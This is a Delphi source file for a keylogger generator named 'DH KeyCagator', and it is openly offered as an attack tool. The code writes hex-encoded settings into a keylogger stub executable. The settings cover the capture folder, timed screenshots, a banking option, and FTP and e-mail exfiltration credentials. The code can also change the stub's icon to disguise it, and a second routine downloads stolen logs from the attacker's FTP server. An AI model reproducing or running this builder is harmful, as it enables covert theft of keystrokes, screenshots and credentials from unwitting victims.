// DH KeyCagator 1.2
// (C) Doddy Hackman 2015
// Keylogger Generator
// Icon Changer based in : "IconChanger" By Chokstyle
// Thanks to Chokstyle

unit dhkey;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.Imaging.jpeg,
  Vcl.ExtCtrls, Vcl.StdCtrls, Vcl.Imaging.pngimage, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdExplicitTLSClientServerBase,
  IdFTP, ShellApi, MadRes;

type
  TForm1 = class(TForm)
    Image1: TImage;
    StatusBar1: TStatusBar;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    ComboBox1: TComboBox;
    Edit2: TEdit;
    GroupBox3: TGroupBox;
    TabSheet2: TTabSheet;
    Edit1: TEdit;
    GroupBox4: TGroupBox;
    CheckBox1: TCheckBox;
    Edit3: TEdit;
    Label1: TLabel;
    TabSheet3: TTabSheet;
    GroupBox5: TGroupBox;
    GroupBox6: TGroupBox;
    CheckBox2: TCheckBox;
    Edit4: TEdit;
    Label2: TLabel;
    GroupBox7: TGroupBox;
    Label3: TLabel;
    Edit5: TEdit;
    Label4: TLabel;
    Edit7: TEdit;
    Label5: TLabel;
    Edit8: TEdit;
    Label6: TLabel;
    Edit6: TEdit;
    TabSheet4: TTabSheet;
    GroupBox8: TGroupBox;
    GroupBox9: TGroupBox;
    Label7: TLabel;
    Edit9: TEdit;
    Label8: TLabel;
    Edit11: TEdit;
    Label9: TLabel;
    Edit12: TEdit;
    Label10: TLabel;
    Edit10: TEdit;
    GroupBox10: TGroupBox;
    Button1: TButton;
    GroupBox12: TGroupBox;
    Button2: TButton;
    CheckBox3: TCheckBox;
    IdFTP1: TIdFTP;
    TabSheet6: TTabSheet;
    GroupBox11: TGroupBox;
    Image2: TImage;
    Memo1: TMemo;
    OpenDialog1: TOpenDialog;
    TabSheet5: TTabSheet;
    GroupBox13: TGroupBox;
    GroupBox14: TGroupBox;
    Label11: TLabel;
    CheckBox4: TCheckBox;
    Edit13: TEdit;
    GroupBox15: TGroupBox;
    Label12: TLabel;
    Label13: TLabel;
    Edit14: TEdit;
    Edit15: TEdit;
    GroupBox16: TGroupBox;
    Edit16: TEdit;
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button2Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

procedure TForm1.Button1Click(Sender: TObject);
var
  i: integer;
  dir: string;
  busqueda: TSearchRec;

begin

  IdFTP1.Host := Edit9.Text;
  IdFTP1.Username := Edit11.Text;
  IdFTP1.Password := Edit12.Text;

  dir := ExtractFilePath(ParamStr(0)) + 'read_ftp\';

  try
    begin
      FindFirst(dir + '\*.*', faAnyFile + faReadOnly, busqueda);
      DeleteFile(dir + '\' + busqueda.Name);
      while FindNext(busqueda) = 0 do
      begin
        DeleteFile(dir + '\' + busqueda.Name);
      end;
      FindClose(busqueda);

      rmdir(dir);
    end;
  except
    //
  end;

  if not(DirectoryExists(dir)) then
  begin
    CreateDir(dir);
  end;

  ChDir(dir);

  try
    begin
      IdFTP1.Connect;
      IdFTP1.ChangeDir(Edit10.Text);

      IdFTP1.List('*.*', True);

      for i := 0 to IdFTP1.DirectoryListing.Count - 1 do
      begin
        IdFTP1.Get(IdFTP1.DirectoryListing.Items[i].FileName,
          IdFTP1.DirectoryListing.Items[i].FileName, False, False);
      end;

      ShellExecute(0, nil, PChar(dir + 'logs.html'), nil, nil, SW_SHOWNORMAL);

      IdFTP1.Disconnect;
      IdFTP1.Free;
    end;
  except
    //
  end;

end;

procedure TForm1.Button2Click(Sender: TObject);
var
  lineafinal: string;

  savein_especial: string;
  savein: string;
  foldername: string;
  bankop: string;

  capture_op: string;
  capture_seconds: integer;

  ftp_op: string;
  ftp_seconds: integer;
  ftp_host_txt: string;
  ftp_user_txt: string;
  ftp_pass_txt: string;
  ftp_path_txt: string;

  mail_op: string;
  mail_seconds: integer;
  mail_user: string;
  mail_pass: string;
  mail_to: string;

  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;

  stubgenerado: string;
  op: string;
  change: DWORD;
  valor: string;

begin

  if (RadioButton1.Checked = True) then

  begin

    savein_especial := '0';

    if (ComboBox1.Items[ComboBox1.ItemIndex] = '') then
    begin
      savein := 'USERPROFILE';
    end
    else
    begin
      savein := ComboBox1.Items[ComboBox1.ItemIndex];
    end;

  end;

  if (RadioButton2.Checked = True) then
  begin
    savein_especial := '1';
    savein := Edit2.Text;
  end;

  foldername := Edit1.Text;

  if (CheckBox1.Checked = True) then
  begin
    capture_op := '1';
  end
  else
  begin
    capture_op := '0';
  end;

  capture_seconds := StrToInt(Edit3.Text) * 1000;

  if (CheckBox2.Checked = True) then
  begin
    ftp_op := '1';
  end
  else
  begin
    ftp_op := '0';
  end;

  if (CheckBox3.Checked = True) then
  begin
    bankop := '1';
  end
  else
  begin
    bankop := '0';
  end;

  if (CheckBox4.Checked = True) then
  begin
    mail_op := '1';
  end
  else
  begin
    mail_op := '0';
  end;

  ftp_seconds := StrToInt(Edit4.Text) * 1000;
  mail_seconds := StrToInt(Edit13.Text) * 1000;

  ftp_host_txt := Edit5.Text;
  ftp_user_txt := Edit7.Text;
  ftp_pass_txt := Edit8.Text;
  ftp_path_txt := Edit6.Text;

  mail_user := Edit14.Text;
  mail_pass := Edit15.Text;
  mail_to := Edit16.Text;

  lineafinal := '[63686175]' + dhencode('[opsave]' + savein_especial +
    '[opsave]' + '[save]' + savein + '[save]' + '[folder]' + foldername +
    '[folder]' + '[capture_op]' + capture_op + '[capture_op]' +
    '[capture_seconds]' + IntToStr(capture_seconds) + '[capture_seconds]' +
    '[bank]' + bankop + '[bank]' + '[ftp_op]' + ftp_op + '[ftp_op]' +
    '[ftp_seconds]' + IntToStr(ftp_seconds) + '[ftp_seconds]' + '[ftp_host]' +
    ftp_host_txt + '[ftp_host]' + '[ftp_user]' + ftp_user_txt + '[ftp_user]' +
    '[ftp_pass]' + ftp_pass_txt + '[ftp_pass]' + '[ftp_path]' + ftp_path_txt +
    '[ftp_path]' + '[mail_op]' + mail_op + '[mail_op]' + '[mail_seconds]' +
    IntToStr(mail_seconds) + '[mail_seconds]' + '[mail_user]' + mail_user +
    '[mail_user]' + '[mail_pass]' + mail_pass + '[mail_pass]' + '[mail_to]' +
    mail_to + '[mail_to]', 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  stubgenerado := 'keycagator_ready.exe';

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' +
    'Data/keycagator.exe'), PChar(ExtractFilePath(Application.ExeName) + '/' +
    stubgenerado), True);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/7z.dll'),
    PChar(ExtractFilePath(Application.ExeName) + '/' + '7z.dll'), True);

  StrCopy(code, PChar(lineafinal));
  aca := CreateFile(PChar('keycagator_ready.exe'), GENERIC_WRITE,
    FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  op := InputBox('Icon Changer', 'Change Icon ?', 'Yes');

  if (op = 'Yes') then
  begin
    OpenDialog1.InitialDir := GetCurrentDir;
    if OpenDialog1.Execute then
    begin

      try
        begin

          valor := IntToStr(128);

          change := BeginUpdateResourceW
            (PWideChar(wideString(ExtractFilePath(Application.ExeName) + '/' +
            stubgenerado)), False);
          LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
            PWideChar(wideString(OpenDialog1.FileName)));
          EndUpdateResourceW(change, False);
          StatusBar1.Panels[0].Text := '[+] Done ';
          StatusBar1.Update;
        end;
      except
        begin
          StatusBar1.Panels[0].Text := '[-] Error';
          StatusBar1.Update;
        end;
      end;
    end
    else
    begin
      StatusBar1.Panels[0].Text := '[+] Done ';
      StatusBar1.Update;
    end;
  end
  else
  begin
    StatusBar1.Panels[0].Text := '[+] Done ';
    StatusBar1.Update;
  end;

end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  OpenDialog1.InitialDir := GetCurrentDir;
  OpenDialog1.Filter := 'ICO|*.ico|';
end;

end.

// The End ?
